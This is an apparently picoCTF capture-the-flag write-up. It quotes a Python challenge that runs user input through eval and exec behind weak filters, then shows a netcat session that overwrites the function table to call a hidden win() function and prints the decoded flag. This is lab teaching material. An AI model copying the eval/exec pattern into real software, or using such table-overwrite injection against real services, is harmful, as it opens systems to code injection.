After downloading the source code, paying attention to the following codes

+ The following lines assume that the ```func_table``` has its own format - the combination four 32-length padded strings
```python
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it'

func_table = ''


def reset_table():
    global func_table

    # This table is formatted for easier viewing, but it is really one line
    func_table = '''print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''


def check_table():
    global func_table

    if (len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
        return False

    return True
```
+ This assumes the running of ```read_variable()``` and ```write_variable()```, we will use them to set a new value for ```func_table``` (including the ```win()```function)
```python
def filter_var_name(var_name):
    r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name)
    if r:
        return True
    else:
        return False


def read_variable():
    var_name = input('Please enter variable name to read: ')
    if (filter_var_name(var_name)):
        eval('print(' + var_name + ')')
    else:
        print('Illegal variable name')


def filter_value(value):
    if ';' in value or '(' in value or ')' in value:
        return False
    else:
        return True


def write_variable():
    var_name = input('Please enter variable name to write: ')
    if (filter_var_name(var_name)):
        value = input('Please enter new value of variable: ')
        if (filter_value(value)):
            exec('global ' + var_name + '; ' + var_name + ' = ' + value)
        else:
            print('Illegal value')
    else:
        print('Illegal variable name')
```
+ This is function printing the flag in hex format
```python
def win():
    # This line will not work locally unless you create your own 'flag.txt' in
    #   the same directory as this script
    flag = open('flag.txt', 'r').read()
    # flag = flag[:-1]
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```
Solving
```commandline
──(stupidhacker㉿kali)-[~]
└─$ nc saturn.picoctf.net 57891
==> help

This program fixes vulnerabilities in its predecessor by limiting what
functions can be called to a table of predefined functions. This still puts
the user in charge, but prevents them from calling undesirable subroutines.

* Enter 'quit' to quit the program.
* Enter 'help' for this text.
* Enter 'reset' to reset the table.
* Enter '1' to execute the first function in the table.
* Enter '2' to execute the second function in the table.
* Enter '3' to execute the third function in the table.
* Enter '4' to execute the fourth function in the table.

Here's the current table:
  
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
==> 2
Please enter variable name to read: func_table
print_table                     read_variable                   write_variable                  getRandomNumber                 
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: "print_table                     read_variable                   write_variable                  win                             "
==> 1
1: print_table
2: read_variable
3: write_variable
4: win
==> 4
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d 
```
The hex-formatted flag: ```0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d```
The flag: ```picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}```
